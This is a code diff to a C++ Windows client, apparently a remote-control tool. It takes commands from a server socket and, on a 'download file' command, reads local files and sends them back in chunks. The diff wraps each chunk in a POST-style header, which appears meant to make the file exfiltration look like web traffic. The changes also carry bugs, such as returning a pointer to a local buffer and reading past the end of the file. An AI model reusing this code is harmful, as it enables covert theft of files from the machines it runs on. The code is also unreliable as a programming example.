@@ -20,6 +20,7 @@ using namespace std;
 #define MAC_ADDR_LEN	17
 #define POST_LEN		210
 #define DEFAULT_BUFLEN  1024
+#define POST_FILE_LEN   1234
 char MacAddr[MAC_ADDR_LEN];
 char cmdbuffer[DEFAULT_BUFLEN] = { 0 };          //用1024的空间来存储输出的内容，只要不是显示文件内容，一般情况下是够用了。  
 
@@ -70,6 +71,18 @@ char* combine(char *s1, char *s2, int len)
 		result[i] = s2[i - POST_LEN];
 	return result;
 }
+
+char* filecombine(char * sendbuf)
+{
+	char ans[POST_FILE_LEN];
+	memset(ans, 0, POST_FILE_LEN);
+	strcpy(ans, PostHead);
+	for (int i = POST_LEN; i < POST_FILE_LEN ; i++)
+		ans[i] = sendbuf[i - POST_LEN];
+	cout << ans<<"<---";
+	return ans;
+}
+
 
 void init()
 {
@@ -206,11 +219,13 @@ int main(int argc, char * argv[])
 		{
 			cout << "Send Info Error::" << GetLastError() << endl;
 			break;
+
 		}
 		//
 		// recv cmd information
 		//
 		Ret = recvn(ClientSocket, ( char * )&reclen, sizeof( unsigned int ));
+		//Ret = recvn(ClientSocket, RecvBuffer, strlen(protocolHead) + sizeof(char *));
 		if ( Ret !=sizeof( unsigned int ) )
 		{
 			printf("接收异常");
@@ -218,6 +233,7 @@ int main(int argc, char * argv[])
 		}
 		//转换网络字节顺序到主机字节顺序
 		reclen = ntohl( reclen );
+		//reclen = (int)(int*)(killhead(RecvBuffer));
 		cout << "接收到" << reclen-2 <<"字节命令"<< endl;
 
 		//
@@ -271,7 +287,7 @@ int main(int argc, char * argv[])
 				// read file and send to server
 				printf("download file: %s\n", pStrCmd);
 				
-				char sendbuf[DEFAULT_BUFLEN+1];
+				char sendbuf[POST_FILE_LEN];
 				FILE *file = NULL;
 				char *filename = pStrCmd;
 				file = fopen(filename, "rb");
@@ -291,18 +307,31 @@ int main(int argc, char * argv[])
 				while (tosendlen > 0)
 				{
 					cout << "还有" << tosendlen << "个字节需要发送" << endl;
-					iResult = send(ClientSocket, PostHead, POST_LEN, 0);
-					fread(sendbuf, 1, DEFAULT_BUFLEN, file);
+					//iResult = send(ClientSocket, PostHead, POST_LEN, 0);
+					memset(sendbuf, 0, POST_FILE_LEN);
+					char* buf = sendbuf;
+					for (int i = 0; i < POST_LEN; i++)
+					{
+						*buf = PostHead[i];
+						buf++;
+					}
+					for (int i = 0; i < DEFAULT_BUFLEN; i++)
+					{
+						fread(buf, 1, 1, file);
+						buf++;
+					}
+
+					//fread(sendbuf, 1, DEFAULT_BUFLEN, file);
 					int iSend = DEFAULT_BUFLEN;
 					if (tosendlen < DEFAULT_BUFLEN) iSend = tosendlen;
-					iResult = send(ClientSocket, sendbuf, iSend, 0);
+					iResult = send(ClientSocket, sendbuf, iSend+ POST_LEN, 0);
 					if (iResult == SOCKET_ERROR) {
 						printf("发送失败！错误编号: %d\n", WSAGetLastError());
 						closesocket(ClientSocket);
 						WSACleanup();
 						return 1;
 					}
-					tosendlen -= iResult;
+					tosendlen -= iResult-POST_LEN;
 				}
 
 				fclose(file);
